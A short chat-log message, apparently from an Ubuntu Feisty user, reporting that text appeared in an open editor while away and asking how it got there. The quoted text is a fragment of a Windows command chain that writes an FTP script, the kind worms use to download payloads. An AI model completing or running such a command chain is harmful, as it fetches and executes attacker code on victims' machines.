2007-09-13T13:16:00.000Z	lobo_nz		Im running Feisty, I left my pc running today while I was at work with a text editor open when I returned this had been inserted in the text editor:  "delete eq&echo open 0.0.0.0 20711 >> eq&echo user 29853 31085" ... it looks like some kind of web attack but how did it get into my system and insert text into my editor?  .. going to look at my server logs now
